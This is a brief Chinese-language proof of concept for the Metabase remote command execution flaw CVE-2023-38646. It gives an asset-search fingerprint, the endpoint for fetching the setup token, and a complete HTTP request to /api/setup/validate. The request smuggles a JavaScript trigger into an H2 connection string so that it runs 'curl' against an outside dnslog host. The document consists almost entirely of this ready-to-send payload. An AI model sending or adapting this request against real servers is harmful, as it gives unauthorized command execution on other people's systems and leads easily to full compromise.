## Metabase validate 远程命令执行漏洞（CVE-2023-38646）
网络测绘
app=“元数据库” 

/api/session/properties
```
POST /api/setup/validate HTTP/1.1
Host: 
Content-Type: application/json
Content-Length: 812

{
    "token": "e56e2c0f-71bf-4e15-9879-d964f319be69",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('curl ecw14d.dnslog.cn')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}

```
